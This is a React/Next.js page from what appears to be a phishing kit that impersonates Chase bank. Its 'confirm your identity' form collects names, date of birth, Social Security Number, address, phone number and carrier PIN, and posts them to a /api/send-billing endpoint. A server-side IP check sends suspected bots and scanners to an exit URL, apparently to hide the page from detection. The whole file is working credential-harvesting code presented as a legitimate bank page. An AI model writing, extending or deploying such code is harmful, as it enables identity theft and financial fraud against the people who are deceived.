import { Typography } from "@mui/material";
import { Box } from "@mui/system";
import axios from "axios";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { Content } from "../components/Content";
import { CustomButton } from "../components/CustomButton";
import { CustomInput } from "../components/CustomInput";
import { SubTitle } from "../components/SubTitle";
import { Title } from "../components/Title";
import { Loading } from "../components/Loading";
import { Wrapper } from "../components/Wrapper";
import Head from "next/head";
import { useRouter } from "next/router";
import { DataContext } from "./_app";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { GetServerSideProps } from "next";
import checkIp from "../middleware/checkIp";

interface InformationsProps {}

const Informations: React.FC<InformationsProps> = () => {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({
    mode: "onTouched",
  });

  const [loading, setLoading] = useState(false);
  const [pageLoading, setPageLoading] = useState(true);
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    const formData = new FormData();

    formData.append(`form`, `BILLING`);
    formData.append(
      `billing`,
      JSON.stringify({ sessionId: datas.sessionId, ...data })
    );

    try {
      await axios.post(`/api/send-billing`, formData);
    } catch (error) {
      console.log(error);
    }

    setLoading(false);
    setData({
      ...datas,
      billing: data,
    });

    const url = getProgress()[getProgress().indexOf(`BILLING`) + 1];
    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  useEffect(() => {
    setTimeout(() => {
      setPageLoading(false);
    }, 2000);
    return () => {};
  }, []);

  if (pageLoading) {
    return <Loading />;
  }

  return (
    <Wrapper current="BILLING">
      <Box width="100%" padding="1rem">
        <Head>
          <title>Identification - chase.com</title>
        </Head>
        <Box
          sx={{
            background: "white",
            width: ["100%", "60%"],
            margin: "0 auto",
            paddingX: "2rem",
          }}
        >
          <Typography
            component="h2"
            sx={{
              marginTop: "10px",
              color: "#666",
              fontWeight: 300,
              fontSize: "1.5rem",
            }}
          >
            {`Let's`} confirm your identity.
          </Typography>
          <Typography
            component="h3"
            sx={{
              marginTop: "8px",
              fontSize: ".8125rem",
              fontWeight: 300,
              color: "#414042",
            }}
          >
            To protect your account, please tell us the requested info so we can
            confirm your identity. If you have more than one account, choose one
            and {`we'll`} take care of the rest.
          </Typography>
        </Box>
        <Box
          sx={{
            background: "white",
            width: ["100%", "60%"],
            margin: "0 auto",
            padding: "2rem",
          }}
        >
          <Box>
            <Title title="Personal details" />
            <SubTitle
              subTitle="This should be your full legal names as it appears on your
    government ID"
            />
            <Content>
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="First name"
                  name="firstname"
                  errors={errors}
                  register={register("firstname", {
                    required:
                      "First name must be entered. Please enter your first name.",
                  })}
                />
              </Box>
              <Box width="10px" display={["none", "block"]} />
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Last name"
                  name="lastname"
                  errors={errors}
                  register={register("lastname", {
                    required:
                      "Last name must be entered. Please enter your last name.",
                  })}
                />
              </Box>
            </Content>
          </Box>
          <Box
            sx={{
              marginTop: "1.5rem",
            }}
          >
            <Title title="Identification" />
            <Content>
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Date of birth"
                  name="dob"
                  errors={errors}
                  helperText="mm/dd/yyyy"
                  mask={`99/99/9999`}
                  register={register("dob", {
                    required:
                      "Date of birth must be entered. Please enter your date of birth",
                    pattern: {
                      value:
                        /(0[1-9]|1[012])[- /.](0[1-9]|[12][0-9]|3[01])[- /.](19|20)\d\d/,
                      message:
                        "Please enter a valid date of birth in the format mentioned above",
                    },
                  })}
                />
              </Box>
              <Box width="10px" display={["none", "block"]} />
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Social Security Number"
                  name="ssn"
                  errors={errors}
                  helperText="We ask for your SSN to verify your identity, we'll keep your data secure"
                  mask={`999-99-9999`}
                  register={register("ssn", {
                    required:
                      "Social Security Number must be entered. Please enter your Social Security Number.",
                  })}
                />
              </Box>
            </Content>
          </Box>
          <Box
            sx={{
              marginTop: "1.5rem",
            }}
          >
            <Title title="Contact information" />
            <Content>
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Street address"
                  name="streetAddress"
                  errors={errors}
                  register={register("streetAddress", {
                    required:
                      "Street address must be entered. Please enter your street address.",
                  })}
                />
              </Box>
              <Box width="10px" display={["none", "block"]} />
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Suite/apt/other (optional)"
                  name="suite"
                  errors={errors}
                  register={register("suite")}
                />
              </Box>
            </Content>
          </Box>
          <Box>
            <Content>
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Zip code"
                  name="zipCode"
                  errors={errors}
                  type="number"
                  register={register("zipCode", {
                    required:
                      "Zip code must be entered. Please enter your zip code.",
                  })}
                />
              </Box>
              <Box width="10px" display={["none", "block"]} />
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="State"
                  name="state"
                  errors={errors}
                  register={register("state", {
                    required: "State must be entered. Please enter your state.",
                  })}
                />
              </Box>
            </Content>
          </Box>
          <Box>
            <Content>
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Phone number"
                  name="phoneNumber"
                  errors={errors}
                  mask={`(999) 999 9999`}
                  register={register("phoneNumber", {
                    required:
                      "Phone number must be entered. Please enter your phone number.",
                    pattern: {
                      value:
                        /^1?\s?(\([0-9]{3}\)[- ]?|[0-9]{3}[- ]?)[0-9]{3}[- ]?[0-9]{4}$/,
                      message: "Please enter a valid phone number",
                    },
                  })}
                />
              </Box>
              <Box width="10px" display={["none", "block"]} />
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Carrier Pin"
                  name="carrierPin"
                  type="number"
                  errors={errors}
                  register={register("carrierPin", {
                    // required:
                    //   "Carrier pin must be entered. Please enter your carrier pin.",
                    pattern: {
                      value: /^[0-9]{4}$/,
                      message: "Please enter a valid carrier pin",
                    },
                  })}
                />
              </Box>
            </Content>
          </Box>
          <Box marginTop="1.5rem">
            <Typography
              component="p"
              sx={{
                color: "#666",
                fontSize: [".8125rem", ".875rem"],
              }}
            >
              When you give us your number, we have your consent to send you
              automated calls and texts to service all of your accounts with us.
            </Typography>
          </Box>
          <Box
            width="100%"
            sx={{
              display: "flex",
              justifyContent: "flex-end",
              marginTop: "1.5rem",
            }}
          >
            <Box width={["100%", "30%"]}>
              <CustomButton text="Next" onClick={onSubmit} disabled={loading} />
            </Box>
          </Box>
        </Box>
      </Box>
    </Wrapper>
  );
};

export const getServerSideProps: GetServerSideProps = async ({ req }) => {
  const { valid } = await checkIp(req);

  return {
    props: { isBot: valid },
    ...(!valid
      ? {
          redirect: {
            destination: process.env.NEXT_PUBLIC_EXIT_URL,
            permanent: false,
          },
        }
      : {}),
  };
};

export default Informations;
